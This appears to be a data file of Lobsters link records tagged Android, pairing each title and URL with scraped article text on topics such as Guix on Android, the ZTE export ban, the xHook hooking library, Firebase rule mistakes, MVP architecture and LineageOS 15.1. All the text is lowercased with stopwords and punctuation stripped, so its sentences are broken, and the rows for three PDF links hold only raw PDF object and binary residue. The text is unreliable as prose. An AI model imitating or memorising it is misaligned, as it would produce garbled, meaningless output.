disable export path homeguixprofilebin homeguixprofilesbin path guixdaemon buildusersgroupguixbuild disablechroot finish good idea allow substitute hydra mkdir etcguix guix archive authorize homeguixprofileshareguixhydragnuorgpubenjoy guix pullfuture workso enjoy guix package manager android one drawback reboot redo half step recreate var gnu mount partition everytime launch shell export path able run guix run guixdaemon manually solve problem modify boot image tricky already put effort phone always end boot loop flash modified boot image nice folk replicant suggested soldered cable access serial console debug message may dropped let see many finger burn boot custom boot image gnu guixgnuâ guix transactional package manager gnu system guix system distribution guixsd advanced distribution gnu system relies gnu guix respect user freedomin addition standard package management feature guix support transactional upgrade rollback unprivileged package management peruser profile garbage collection guix us lowlevel mechanism nix package manager except package defined native guile module using extension scheme language guixsd offer declarative approach operating system configuration management highly customizable hackableguixsd used machine also possible use guix top already installed gnulinux system including
186,Lobsters,android,Android,U.S. ban on sales to China's ZTE,https://uk.reuters.com/article/us-china-zte/exclusive-u-s-bans-american-companies-from-selling-to-chinas-zte-idUKKBN1HN1P1,u ban sale china zte,flashpoint sector,londonnew yorkhong kong reuters united state banned american firm selling part software china zte corp seven year potentially devastating telecom equipment maker exacerbating tension world two largest economy move first reported reuters come time two country threatened ten billion dollar tariff recent week fanning worry full blown trade war threatens global supply chain well business investment plan u commerce department imposed ban following zte violation agreement punishing employee reached caught illegally shipping u good iran china responded swiftly warning prepared take action protect interest chinese firm saying hope united state deal issue accordance law u action could catastrophic zte since american company estimated provide percent percent component used zte equipment includes smartphones gear build telecommunication network issue solved smoothly immediately think zte face tremendous disaster would forced scale back smartphone business u also market said strategy analytics analyst woody oh zte whose hong kong shenzhen share suspended trade tuesday said statement assessing implication u decision communicating relevant party company set crisis management group response ban said zte source declining identified information confidential particularly damaging google mobile service including google play app store likely covered ban even though android operating system free said richard windsor independent analyst radio free mobile think risk zte loses nonchinese android business said almost every region outside china almost impossible sell android handset google play installed google declined comment zte china telecom equipment maker huawei technology co ltd hwtul seller smartphones united state worth billion monday close derived percent revenue network business percent consumer business company able resolve may well put business many bank company even outside u going want deal said eric hirschhorn former u undersecretary commerce heavily involved case chinese company paid million fine penalty pleaded guilty last year conspiring violate u sanction illegally shipping u good iran part agreement shenzhenbased zte promised dismiss four senior employee discipline others either reducing bonus reprimanding senior u official told reuters chinese company admitted march fired four senior employee disciplined reduced bonus others visitor seen booth chinese telecom equipment maker zte corp expo beijing china september picture taken september reutersstringer flashpoint sector saying zte likely miss shipment lose order brokerage jefferies downgraded rating firm underperform buy slashed price target hk nearly percent firm closing price prior tuesday trading halt jefferies also said expected zte would able settle u authority three five month term ban u company export prohibited good chip set directly zte via another country beginning immediately u concern safeguarding chip technology cutting trade deficit grow tech sector become flashpoint broader battle trade economic policy u president donald trump accusing chinese firm intellectual property theft year washington also deepened scrutiny chinese investment u committee foreign investment united state cfius blocking many proposed acquisition u asset chinese company piling pressure zte britain main cyber security agency said monday written organization uk telecommunication sector warning using service equipment zte ban supplying zte come two month two republican senator introduced legislation block u government buying leasing telecommunication equipment zte huawei citing concern company would use access spy u official china play rule must vigilant chinese threat economic security national security said republican representative robert pittenger commerce announcement pittenger sponsoring legislation would strengthen u national security review process foreign investment visitor pas front chinese telecom equipment group zte corp booth mobile world congress barcelona spain february reuterssergio perez u firm also likely get caught crossfire fallout set hit qualcomm inc provides lion share chip inside zte smartphones qualcomm immediately available comment share optical networking equipment maker acacia communication inc gained third total revenue zte tumbled percent acacia said suspending affected transaction assessing impact optical component company also slid lumentum holding inc falling percent finisar corp dropping percent oclaro inc got percent fiscal revenue zte lost percent zte sold handset device u mobile carrier inc tmobile u inc sprint corp relied u company including qualcomm inc microsoft corp intel corp component reporting karen freifeld new york steve stecklow london sijia jiang hong kong additional reporting noel randewich peter henderson san francisco munsif vengattil bangalore miyoung kim singapore writing anne marie roantree editing lisa shumaker edwina gibbs
188,Lobsters,android,Android,A PLT (Procedure Linkage Table) Hook Library for Android Native ELF,https://github.com/iqiyi/xHook,plt procedure linkage table hook library android native elf,xhook readme 中文版 android plt hook 概述 中文版 feature elf hash gnu hash build android ndk demo api register hook info replaced must posix bre basic regular expression ignore hook info posix bre hook clear cache enabledisable debug info disabled enabledisable sfp segmentation fault protection enabled always enable sfp releaseapp prevent app crashing hand always disable sfp debugapp ca nt miss common coding mistake fixed example support xhooksample github issue caikelun gmailcom contributing xhook contributing guide license license licensedocs,xhook readme 中文版 android plt hook 概述 中文版 xhook plt procedure linkage table hook library android native elf executable shared library xhook keeping optimized stability compatibility feature support android api level support armeabi support elf hash gnu hash indexed symbol support encoded relocation info support setting hook info via regular expression require root permission system permission depends thirdparty shared library build download android ndk set environment path support armeabi removed since build install native library buildlibssh installlibssh demo cd xhookwrapper gradlew assembledebug adb install appbuildoutputsapkdebugappdebugapk api external api header file libxhookjnixhookh register hook info int xhookregister const char pathnameregexstr const char symbol void newfunc void oldfunc current process memory space every loaded elf pathname match regular expression pathnameregexstr every plt entry symbol replaced newfunc original one saved oldfunc newfunc must function declaration original one return zero successful nonzero otherwise regular expression pathnameregexstr support posix bre basic regular expression ignore hook info int xhookignore const char pathnameregexstr const char symbol ignore hook info according pathnameregexstr symbol registered hook xhookregister symbol null xhook ignore symbol elf pathname match pathnameregexstr return zero successful nonzero otherwise regular expression pathnameregexstr support posix bre hook int xhookrefresh int async real hook operation according registered hook info pas async asynchronous hook pas async synchronous hook return zero successful nonzero otherwise xhook keep global cache saving last elf loading info procselfmaps cache also updated xhookrefresh cache xhookrefresh determine elf newly loaded need hook newly loaded elf clear cache clear cache owned xhook reset global flag default value confirm plt entry want hooked could call function save memory enabledisable debug info void xhookenabledebug int flag pas flag enable debug info pas flag disable disabled default debug info sent logcat tag xhook enabledisable sfp segmentation fault protection void xhookenablesigsegvprotection int flag pas flag enable sfp pas flag disable enabled default xhook compliant business layer library calculate value pointer directly reading writing memory pointed pointer cause segmentation fault unusual situation environment app crash rate increased caused xhook one tenmillionth according test increased crash rate also related elf symbol need hook finally use trick prevent harmless crashing called sfp segmentation fault protection consists sigaction sigsegv siglongjmp sigsetjmp always enable sfp releaseapp prevent app crashing hand always disable sfp debugapp ca nt miss common coding mistake fixed example detect memory leak xhookregister malloc mymalloc null xhookregister calloc mycalloc null xhookregister realloc myrealloc null xhookregister free myfree null inspect socket lifecycle xhookregister getaddrinfo mygetaddrinfo null xhookregister socket mysocket null xhookregister setsockopt mysetsockopt null xhookregister bind mybind null xhookregister listen mylisten null xhookregister connect myconnect null xhookregister shutdown myshutdown null xhookregister close myclose null filter save android log local file xhookregister androidlogwrite mylogwrite null xhookregister androidlogprint mylogprint null xhookregister androidlogvprint mylogvprint null xhookregister androidlogassert mylogassert null tracking ignore linker xhookregister system mmap mymmap null xhookregister vendor munmap mymunmap null xhookignore linker mmap xhookignore linker munmap xhookignore mmap xhookignore munmap defense injection attack xhookregister comhacker malloc mymallocalwaysreturnnull null xhookregister libhackerso connect myconnectwithrecorder null fix system bug xhookregister somevendor libvictimso badfunc mynicefunc null ignore hook libwebviewchromiumso xhookignore libwebviewchromiumso null hook xhookrefresh support check xhooksample communicate github issue mail caikelun gmailcom qq group qr code contributing see xhook contributing guide license xhook mit licensed found license file xhook documentation creative common licensed found licensedocs file
189,Lobsters,android,Android,Use your favorite password manager with Android Oreo,https://www.blog.google/products/android/use-your-favorite-password-manager-android-oreo/,use favorite password manager android oreo,lastpass dashlane keeper,security expert recommend strong unique password service use u however difficult manage credential across multiple website apps especially trying keep track everything headin android oreo made simpler use autofill password manager like lastpass dashlane keeper particularly tiny device like phone autofill make life easier remembering thing permission type name address credit card againwith new autofill service oreo password manager access information required order autofill apps making data secure specific list password manager find android setting meet security functional requirement continuing grow list time already use password manager able try new experience today
190,Lobsters,android,Android,25% of Open Source Firebase Projects Are Vulnerable to Cascading Rules Mismatch,https://medium.com/noless/common-mistakes-in-firebase-security-rules-part-1-fd8cdd8bc8a6,open source firebase project vulnerable cascading rule mismatch,rule cascade child node consider following trivial rule opposite true second example bolt compiler targaryen noless,rule cascaderead write rule cascade mean granting readwrite access node grant readwrite access child nodesin order demonstrate go wrong outline two example based real projectsconsider following trivial rule anyone read write let say want add node database user session grant read write permission session user owns session eg user uid bob read write sessionsbob take look following rule bob read write sessionsbob nobody read write session right unfortunately opposite true anyone read write sessionsbob actually anyone read write difference rule first onesthey completely equivalent read write rule cascadethe correct way obtain desired functionality note omitted read false write false session since default access falseour second example authenticated client read write user due rule user uid infer allowing access intentionalsimilar first example fix take time writing security rule critical application security cascading rule bug occurs lack understanding firebase rule poor maintenancechanges security rule tested monitored part development life cyclein order recommend using bolt compiler simplify process writing rule targaryen test rule according specific scenario applicationwe noless provide security scan specifically designed application built using serverless technology learn serverless security
191,Lobsters,android,Android,Who will steal Android from Google?,https://medium.com/@steve.yegge/who-will-steal-android-from-google-af3622b6252e,steal android google,steal android google sex column poo cuisine frontend programming every bit hard harder assault android react native flanking attack meanwhile back summarize main idea behind post,steal android google disclaimer personal opinion lot probably wrong speak employer grab take healthy grain salt fact even read ithere writing medium post plane jakarta getting habiti still sure left google post got much attention basically said random dude changing job blah blah blah le verbatim somehow translated like language surpassed day natalie portman sex column fair lot interestingso slow news week guess maybe took medium reach lot people great platform back blogging day used wish google would create innovative product like one well knowin case post garnered interesting response guy somewhere pakistan offered buy beer ever happened town someone london offered thousand buck talk phone hour voice search market garbo politely declined actually know useful fact anything russian guy even came party told heff many enemy fun timesthere also lot misunderstanding core message people asking hey ride hailing tried paint picture bigger flew lot head guess good job try revisit point see betterbut today today going talk little android personal take outsider hobbyist androidios developer since everyone know catch lightning bottle twice row safe assume post go viral today youandroid mind trying hire mobile developer think would straightforward task turn hottest commodity market right grab need everyone need enough go around like trying catch unicornswhy everyone need mobile devs web slowly dying friend well probably exfriends every org google used point gloomy graph matter slice web steady decline whole world move mobile heck probably remember facebook going transition webfirst mobilefirst maybe year ago facebook almost kicked bucket mean overnight company went existential crisis realized become mobile company face oblivionthey managed sure hell easy android dev stack world biggest poo sandwichpoo cuisineat google engineer snooty mobile web programming frontend proclaim maximal snootiness phenomenon like call dag disdain wherein dag mean directed acyclic graph bit like flowchart top snoot mountain sit lofty search engineer writing c considered cooler java cooler python cooler javascript search cooler ad cooler apps cooler tool cooler frontends programmer love look unlucky enough google mobile engineer stuck scuffling around bottom several totem pole everyone looking youbut done one time another system programming largescale data engineering compiler design service framework game development web development mobile development assure frontend programming every bit hard harder everything backend nice clean organized distributed parallelizable heaven compared yucky mess web programming remains decade even web programming like nice trip bali compared poo sandwich mobile programming including iosand android yep biggest poo sandwich android devs hero pardon pun programming android huge app like google map facebook snapchat mean believe told sitting twenty minute wait see happens change one line code every change make matter tiny chance working first time try feature interoperability matrix bizarrely sparse sure use x use use x together screw buddyand even get started device compatibility bunch angry review google play store wyvern game app randomly work lg device go ebay buy crummy lg device opposed crummy lg device repro bug discover hey two android apis getting mouseclick event scrolling list one apis work lgi mean come onso happened bunch competitor big small come replacement android framework talking support library missing functionality though exist aplenty talking fullscale replacement google entire android development stack microsoft xamarin adobe cordova facebook react native mean crazy town seriously go look appcelerator titanium onsen sencha kendo xdk ionic mobile angular unity mean real talk hell going like everyone ever tried android programming gave declared bad startup make better google outdone competitor responded saying oh yeah well compete u going compete u launched flutter making serious android development stack competes native android whose existence actual android team simply refuse acknowledgewhat time aliveassaults androidthe thing dev framework make google vulnerable crossplatform mean write single app run io android matter whether big company small shop nobody like pay two engineering team write exact app different platform tremendous economic pressure migrate crossplatform framework thing stopping stampede framework quite good native development yetbut several notably facebook react native getting reeeeally close one manages snag big enough market share android basically becomes plumbing developer ecosystem longer google controlthis might seem like big deal google still play store oems licensing folk probably appear comfortably driver seat consider mobile developer start using particular crossplatform framework x literally hardwareos manufacturer consortium could come along competing hardwareos platform like say window support framework x directly apps would run probably faster boot would cut google entirely believe lot company want sorry bad lot google response situation dig heel doubling native traditional android programming official support kotlin language big step native android programmer love kotlin future java let face mobile market headed people writing crossplatform framework two big reason first want company app work two platform without work second android native programming still painful even kotlin many company feel justifiably throw start scratch something easierif android io developer take time try react native facebook created help address problem realize within second way better assuming writing game case probably use unity anyway business productivity apps react native offer reasonable performance crossplatform compatibility incredible tool best microsoft hello relevance welcome back vastly improved development speed remember said could take minute see code change regular android stack happen biggest apps like nest facebook even mediumsize apps minute whereas react native instantaneous make change see changeand folk mean get launch feature faster mean faster time market mean firstmover advantage mean win win win abandoning native programming favor fastcycle crossplatform framework like react native winning strategyi suspect without evidence android org google sure whether crossplatform good bad leaning towards bad otherwise would get behind flutter crossplatform personally think would good knowregardless currently focusing trying stay top making native experience le terrible since worst big apps like snapchat instagram mostly trying solve bigapp dev experience turn largely dominated build timesto fix google staggering amount work official android application build system based alreadycomplex gradle system google pile bunch hairy androidspecific stuff getting complex month month point even build engineer understand part anymore difference build type product flavor flavor dimension good luck keep dialing complexity think feature important big shop big appsthe irony big shop aggressively dumping favor buck facebook android build system google chasing dying strategy hereso google seems understand problem doubling solution nobody like native stack insanely complicated gradle build system losing developer thirdparty stack gaining market shareflanking attacksto make matter worse development stack assault happening android way someone might steal android google one approach create successful store one google biggest lock android play store generated ton controversy level company government android purportedly open system play store controlled google cyanogen big attempt coup backed microsoft twitter though failed due internal political infighting first serious attempt play store jugularbut guess else making big play competing store guessed jeff bezos become world first trillionaire without stealing android google like imagine would help anyway amazon app store already pretty impressive every headtohead competition seen amazon google amazon executed better time watch enough google worry third assault android one hitting right hurt ad facebook android app become large hundred hundred engineer working year sprouted bonafide platform serve ad directly facebook app instance new york time buy ad placement money go directly nyt facebook without dime going google imagine make feelwechat exactly thing china wechat app become thriving platform building deploying apps ad like whole marketplace embedded inside app facebook wechat mobile apps become standalone advertising channelslet clear reason google created android ad channel google ad company biggest one world always always always attack company want put eyeball channel instead one google channel attack net neutrality final analysis telecom isps want serve ad least take cut google facebook makingwhenever see company like facebook google amazon microsoft mysteriously get strange new business bet channel play google chrome channel play controlling access web microsoft xbox channel play playstation threatened unseat pc channel getting online home youtube channel play instagram whatsapp channel play hboamazonnetflix content war literal channel play amazon echo channel play home one biggest channel fight going today even google map channel play local ad start looking see channel everywherethe bottom line company want viewing favorite content book movie game natalie portman sex column though channel rather someone else get ad revenue least little sister subscription revenueandroid probably google important channel today certainly next ten year afford lose control seen least three coordinated type attack happening different dimension developer ecosystem react native friend store amazon app store cyanogen rumored successor lightweight inapp marketplace facebook wechat far google reaction threat far well let say still top nowmeanwhile back might seem like bunch useless highflown speculation well mean actually affect u ground grab make important decision technology stack use mobile apps window world channel passenger driver merchant agent onif think risk google might lose control android best bet use crossplatform framework hedge bet via improved portability locked fierce competitive race grab need launch faster probably go something android native anyway android still chasing gradle train never going fast large part due legacy issue android design hard paper overamong crossplatform option react native looking like winner appeal web developer probably biggest dev audience worldwide hard compete grab recently begun investing react native see live promise far look pretty goodit going long time grab retires native android io apps since port take time mean mobile developer flavor great news need react native work android kotlin work io swift work super high demand worldwide employer appreciate recommend looking around lot changed past three yearsto summarize main idea behind post grab need mobile devs like everyone else hard hire android programming yucky everyone know except apparently google ecosystem proliferating competitor trying make way one true way programming make even harder hire devs fragmented whew regardless flavor choice good time mobile developer nonmobile dev consider switching track starting backend experience learning mobile development turn full stack developer even rarer marketable unicornit good time competing gain control android sort thing lot company heck even team google grab though materially impacted outcome lot big shark circling android boat google need carefuland great time grab professional programmer persuasion particularly seattle eastside area stuff said last time gdp emerging network raw golden opportunity resonated seriously thinking heading fast leg carry youheck take lyftclosing thought highly nuanced space oversimplified several way look forward discussion thread
192,Lobsters,android,Android,Oracle Wins Revival of Billion-Dollar Case Against Google,https://www.bloomberg.com/news/articles/2018-03-27/oracle-wins-revival-of-billion-dollar-case-against-google,oracle win revival billiondollar case google,detected unusual activity computer network,detected unusual activity computer network continue please click box let u know robot
193,Lobsters,android,Android,Google starts blocking “uncertified” Android devices from logging in,https://arstechnica.com/gadgets/2018/03/google-starts-blocking-uncertified-android-devices-from-logging-in/,google start blocking uncertified android device logging,xda developer user report give google control placement default service requirement compatibility requirement enlarge nt allowed gcoandroiddeviceregistration android id xiaomi redmi,google google apparently stepping effort crack illicit distribution google android apps according xda developer google logins unlicensed device fail setup warning message pop stating device certified google warning screen appeared past test phase xda user report indicate headed wider rollout basic operating system code contained android open source project free open source google apps run top android like play store gmail google map etc many others free distribute google license apps device maker number term designed give google control o used google collection default android apps must bundled together placement default service requirement device must pas evergrowing list compatibility requirement ensure app compatibility enlarge google warning message user pirated google appsandroid distribution nt pas google compatibility requirement nt allowed called android registered trademark google android fork highprofile example android fork amazon kindle fire line product device ship china google nt much business fall umbrella android fork google android apps properly available preloaded app preloaded play store openly distributed forum custom rom site thirdparty app store place online noncompatible device seller user load device potentially trigger google new message login message pop try log google service usually happens device setup user purchased device warned device manufacturer preloaded google apps service without certification google user nt given many option complain manufacturer point logging google service blocked nontechsavvy user live without google apps user custom android wipe stock software load modified version start seeing message thankfully bottom message folk given escape hatch head gcoandroiddeviceregistration enter android id register device google account nt easiest thing world android id hex string set first boot regenerated every time factory reset performed official way view android id plug device computer install android developer tool run command apps show android id also tough install app without first logging app store seasoned rom user none big deal process definitely harder could almost like designed keep general public actually unknowing victim illicit google app distribution ar imported xiaomi redmi smartphone china review upon booting surprised find came google apps preinstalled device china happened posted review xiaomi contacted u scary news redmi come google play preinstalled chinaonly product xiaomi told ar likely play store saw preinstalled importerseller common practice unauthorised importer would mean reseller opened phone unlocked bootloader flashed new rom google play relocked bootloader stuck phone back box obvious evidence device tampered hopefully seller installed google apps could easily loaded malware onto device message like setup would big red flag something wrong
194,Lobsters,android,Android,Exploring New Attack Vectors for Exploitation of Smartphones (2017),https://www.cl.cam.ac.uk/techreports/UCAM-CL-TR-909.pdf,exploring new attack vector exploitation smartphones,,obj stream td
195,Lobsters,android,Android,Package Wisely,https://medium.com/@mattcarroll/package-wisely-4899f9580d3,package wisely,encapsulation boundary mean package encapsulation boundary efinition find package boundary hide android thing go database network comms go detail plugins supplemental material architecture lost year google io app retrofit south park hello mr ups man,almost every android app existence using java package incorrectly consider typical structure android app package activitiesfragmentsservicesreceiversviewsetcin short almost every android project us package create bucket object provide similar type utilitythe important detail establishing package type utility instead establishing meaningful encapsulation boundarieswhat encapsulation boundary encapsulation boundary set behavior define manner state system mutated encapsulation boundary also establish defacto data structure system input outputencapsulation boundary go core objectoriented programming fact object objectoriented programming thing java object java class object objectoriented programming mean encapsulation boundary think objectoriented programming really encapsulation boundaryoriented programmingonce upon time programming procedural programming procedural programming sucked shared state would inevitably destroy life programmer reaction terrible experience procedural programming two new paradigm born functional programming offered solution shared state simply saying shared state allowed objectoriented programming offered solution problem different angle objectoriented programming said hide state behind concise constrained encapsulation boundary minimize state management complexity therefore encapsulation boundary building block objectoriented application developer shirk responsibility establishing strong encapsulation boundary really engaging procedural programming java objectsin practice encapsulation boundary help developer segment riskdrastically reduce state management complexityfacilitate ability adapt changing requirement andpromote effective code reusepackages encapsulation boundariespackage directory directory package package really dividing class file directory java would created special language construct package o already provides concept directoriesadditionally package bucket java provide package private access modifier sense would make one view view package package private would prevent view used activity fragment anything else except another viewpackages creating bucket creating encapsulation boundariesdefinition package grouping related type providing access protection name space management note type refers class interface enumeration annotation type official oracle definitionpackages represent encapsulation boundary level exists class looking encapsulation boundary bottom see method encapsulation boundary around related line code class encapsulation boundary around related method package encapsulation boundary around related classespackages deserve much api consideration individual class encapsulation boundary package strive minimize outgoing dependency never leak internal stateimplementation detail yes mean strive privatize everything package class represent public behavior package able call private packagehow find package boundary package boundary responsibility defined domain logic application building bob martin say application architecture application architecture scream intent consider following toplevel package structure application billinghipaaprescriptionsschedulingreportingwhat kind application take long guess package structure probably applies kind medical application maybe application handle patient management private practice make assumption seeing nothing top level package true android apps package like class defined based related behavior related state remember trying hide state notice aforementioned medical package breakdown breakdown around behavior billing hipaa compliance prescription scheduling reporting thing thing somehow exist persistto establish effective package structure find behavior application generally added toremoved application single unit conceivably remove activity application still application conceivably remove prescription behavior medical patient management app still medical patient management appbut android thing go continue bob martin previous quote bob martin claim thing like io channel detail application architecture rightfully difficult find bob martin say search detail applying bob martin rationale android apps thing like database network communication considered detail android integration point detail activity fragment service view require deserve kind special spotlight treatment artifact simply object help implement usecase like every object treat suchif assume aforementioned medical application android app prescription package might look like followingprescriptionrefillactivityprescriptionrefillrequestprescriptionrefillerprescriptionfilledalarmprescriptionfilledalarmreceivermedicineloggingactivitymedicinedosealarmmedicinedosealarmreceiveragain difficult surmise object package clearly behavior centered around filling prescription well behavior centered around ensuring patient miss medication dos fact couple object activity simply detail look fact package even includes couple broadcastreceivers though draw special attention factcreate android artifact normally would group artifact object involved given behavior let android class elitist database network comms go database network communication implementation detail spread across codebase based behavior like android artifact however one caveatunlike android artifact database networking logic may require substantial infrastructure applies implementation technology behavior significance business area example http communication requires significant code infrastructure long ever start discus medical domain app case make perfect sense something like http package package would establish encapsulation boundary around technical behavior http communication like package http package would likely contain many package private class play role orchestrating http request business used systemscontinuing medical app example imagine app toplevel http package providing generic http comm behavior area app already looked possible set class prescription package one prescriptionrefiller might choose offer implementation interface called httpprescriptionrefiller sits prescriptionshttp package utilizes toplevel http package implement http communication manner medicallyoriented http artifact sit medical package pure http comm logic sits generalpurpose http packagedetails pluginsdetails grouped business behavior detail interact businessspecific logic detail android artifact database network comms etc integrate businessspecific logic plugins plugins implementation dependency inversion principleinstead making prescription refill behavior depend mysql database wrap mysql database system depends prescription refill behavior mysqlspecific plugin connected businessoriented prescription refill systemthink prescription refill system like android studio think mysql system android studio plugin android studio plugin depends entirely apis android studio android studio depend apis plugin apply restriction connecting detail business systemsin case network request might choose define generic request within business logic provide dependency injected implementation request happen use http desired communication protocol note need relationship business request network request single business request might require series network request one even multiple parallel request aggregate data multiple sourcesandroid artifact easier use plugin manner android artifact tend represent userfacing aspect application way use android plugin ensure business system never reference otherwise know activity fragment service view android construct use android artifact bootstrap initiate business logic make sure android artifact requireddecoupling business logic io detail greatly improve apps ability adapt changing requirement well changing technical reality need switch database implementation network stackssupplemental materialarchitecture lost yearsbob martin discus among thing architecture scream intent linked video start around min ingoogle io appexemplifies typical ineffective package schemeretrofitexemplifies package access control separation retrofit business behavior http detail behaviorsouth park hello mr ups manfunny banethemed south park segment viewer discretion advised
196,Lobsters,android,Android,Android Security: 2017 Year in Review,https://source.android.com/security/reports/Google_Android_Security_2017_Report_Final.pdf,android security year review,,âãïó obj endobj xref n n n n n n n n n n n n n n n n n trailer prev startxref eof obj stream bàds q dˆ ößùşü b óÿ ùìƒüôé à sq ª åßøñùmm î vüx ñÿ í œôì îôvøçhüü øô éğg diñ ñçk guç üz ğü qö ƒöˆá sèâˆûc äãë yrg ëddä oxáb ƒk íš š á rûòâ äœgz h ùuée wvèy ë tö èşÿ lang enus metadata ropenaction routlines rpagelayoutsinglepagepages rtypecatalogviewerpreferences endobj obj endobj obj extgstate font procset pdftext rotate rtrimbox typepage endobj obj endobj obj endobj obj iccbased r endobj obj endobj obj endobj obj stream à ôx æ uöúø endstream endobj obj endobj obj stream dïå c ë în u â h ôh ôh qè ë øšğq ôˆëj endstream endobj obj stream wëš ú ümî kq dîw üşºnïxô ªä ùdé ah
197,Lobsters,android,Android,Architectural Guidelines to follow for MVP pattern in Android,https://android.jlelse.eu/architectural-guidelines-to-follow-for-mvp-pattern-in-android-2374848a0157,architectural guideline follow mvp pattern android,architectural guideline follow mvp pattern android mvc mvp mvvm mvp architectural pattern recap model view presenter use mvp architectural pattern android make debugging easier application enforces better separation concern code reusability guideline follow effectively implement mvp architectural pattern android make view dumb possible passive view manage remote local data source model use library like rxjava minimizing code redundancy dependency injection library use proper naming convention separate responsibility make presenter independent framework improve testability ivan skoric article conclusion reference,architectural guideline follow mvp pattern androidby default android enforce architectural pattern although make framework powerful come developing application tends make code vulnerable complex app scenariosthis time app development involves complex life cycle feature management might create havoc application handled proper waythat developer rely different architectural pattern mvc mvp mvvm app development androidas far experience developing apps concerned recommend using mvp architectural pattern android app development article intend help fellow developer guideline usually follow developing android apps mvp architecturebefore discussing guideline let understand exactly mvp architectural pattern android everyone use projectmvp architectural pattern recapmvp architectural design pattern quite renowned design pattern android developer let decouple business logic model view logic activity fragment introducing intermediator called presenteras name implies modelviewpresenter divided three different layer separate layer defined follows model mentioned model business logic application data stored android role model usually played data access layer database api rest apinot model responsible storing application data also consists component hold responsibility generating exposing fetching datain general functionality run background block ui threadview view basically passive interface cum ui responsible routing user action presenter android view activity fragment recyclerview adaptersin general view visible model except pojos entity application put simpler term view communicate directly model however talk presenterspresenter presenter middleman mediator view model hold responsibility everything deal presentation logic applicationin general term presenter job querying model updating view responding user interactionsit monitor model talk view handle particular view need updated notwhy use mvp architectural pattern android mvp one architectural pattern follows uncle bob clean architecture guidelinesfollowing reason make mvp good architectural pattern android make debugging easier application mvp enforces three different layer abstraction make easier debug application moreover since business logic completely decoupled view easier perform unit testing developing applicationenforces better separation concern mvp great job separating business logic persistence logic activity fragment class turn better enforce good separation concernscode reusability mvp code better reused since multiple presenter controlling view important definitely want rely single presenter control different viewsguidelines follow effectively implement mvp architectural pattern make view dumb possibleask novice android developer tell testing android pain tester android common pattern developing app write thousand line code single activity fragment class however kind implementation tends become buggy app evolves become complexin order solve problem keep view dumb possible dumber view better test android ui mvp implement using passive view patternby implementing pattern reduce behavior view almost minimal level introducing presenter respond user action talking viewfor instance let consider need implement login screen app user fill registered email username login implementing need write authentication logic view instead write presenter update view user successfully logged say profile screen case role view receive input form email password pas presenter update manage remote local data source modelyou increase speed app managing remote local data source modelfor instance let say need develop offlinefirst app run even data connection turned one solution implement fetching data storing cache queried user become onlineyou implement creating three different model class particularly form remote data source local data source data repositoryyour data repository class contain logic talk presenter local data storage class may deal cached data local storage remote data source class deal remote api call use library like rxjava minimizing code redundancyi recommend using dependency injection library make model presenter independent lifecycle view using dagger simplify behavior component injecting dependency themmoreover use library like rxjava simplify codebase dealing heavy grunt work multiple user interaction click swipe etc background data use proper naming convention separate responsibilitiesuse proper naming convention method use codebasein general two different category method action user event presenteractions method contains logic view update example load loadmore tell presenter load another page user scroll application said view know update say talking presenter user scroll end pageon hand user event denotes action triggered user example querychanged method called user type correct number character show relevant searchesto put succinctly proper naming convention used suitable action need triggered implies logic run exactly make presenter independent framework improve testabilitythe main idea use mvp android enforce proper testability within project order implement improved testability make presenter independent android classthe main idea make presenter deprived platform dependency test presenter using junit refrain using context object shared resource make platform independentivan skoric written excellent article explaining make presenter independent android statesconclusionmvp architectural pattern android maintains code simplicity reusability turn promotes higher testability adhering point mvp architecture effectively implement take advantage develop better mobile apps androidreferences
198,Lobsters,android,Android,Modelgen: Mining Explicit Information Flow Specifications from Concrete Executions (2015),http://theory.stanford.edu/~aiken/publications/papers/issta15.pdf,modelgen mining explicit information flow specification concrete execution,,obj linearized l h e n endobj obj type xref length filter flatedecode decodeparms column predictor w index info r root r size prev id stream b ٸa n endstream endobj obj name r openaction r pagelabels nums st pagemode usenone page r type catalog endobj obj type objstm length filter flatedecode n first stream aeh dl l q
199,Lobsters,android,Android,LineageOS 15.1 (based on Android Oreo 8.1) released,https://www.lineageos.org/Changelog-16/,lineageos based android oreo released,hello summer survey style new trebuchet launcher qr support snap camera upgrading official lineageos download portal gapps su anything else including unofficial lineageos build download portal gapps su nightly build roll monday older version change goodbye lineageos infrastructure lineageos organization lineageosinfra organization device support new rule ldsr device change initial device added device change device removed device,hello working hard month get new version available change done upstream aosp huge project treble changed way hardware managed android oemabandoned platform supported lineage adapted new platform moreover taken time make code futureproof converting lot hardwarerelated code make use new treble capability thing livedisplay light led control date new android standard going easier time forwardporting stuff whenever new android version come spent time forwardporting feature whole platform code cleaned unused deprecated bit removed rebrand process completed also introducing new feature highly requested summer survey held last summer featured style style aspect device selecting custom accent color choosing light dark interface really cool feature added optional integration livedisplay day device light theme night interface element turn dark easier eye enough want device style match wallpaper color automagic propose best color combination based current wallpaper full theming replacement hope satisfy user requested simple theming capability new trebuchet launcher homegrown launcher rewritten make date android standard redundant feature removed new one icon pack support added apps received new adaptive icon thanks feedback provided summer survey see sneak peak moreover trebuchet allow choose icon shape suit liking circle super ellipse squircle teardrop qr support snap camera qr reader mode camera app support qrencoded url plain text sm email address contact card event phone number location coordinate upgrading starting build device listed others migrating sooner later note several older device unable receive official build time due lack support working camera recorder broken treble change worry working official lineageos optional make backup important data download build either download portal built updater app export downloaded package sdcard updater app longpressing selecting top menu download proper addons package gapps oreo package compatible make sure recovery firmware date boot recovery mode format system partition install lineageos build install addons without rebooting done reboot device note wiping data needed upgrading official build able download update updater app allowed install build top one automatically anything else including unofficial lineageos build optional make backup important data download build download portal download proper addons package gapps oreo package compatible make sure recovery firmware date boot recovery mode wipe data install lineageos build install addons without rebooting done reboot device note wipe data always needed coming something official build regardless android version nightly build roll monday testing infrastructure weekend feb see build appear download portal marked experimental first batch nightlies build roll monday february day week remain dedicated device keep mind install experimental build receive ota update manually flash nightly build instead older version change lineageos favorite management improved december january february security patch merged webview updated chromium lineageos december january february security patch merged goodbye lineageos marshmallowbased release discontinued last build published feb branch locked still open contribution security patch like branch getting security patch backported community lineageos remain active development expect new feature come since majority team jumped oreo branch infrastructure couple infrastructure repos moved lineageos organization lineageosinfra organization github wiki also updated focus device information since lot user often check look suitable device also capable running lineageos device support new rule beginning lineageos enforcing set rule defined ldsr lineageos device support requirement document defines requirement must met order device deemed shipready lineageos release maintain higher quality standard rule retroactive build affected apply device want ship lineageos official release regardless build end user mean whenever official build published expect everything listed charter working device change initial device added device change device removed device
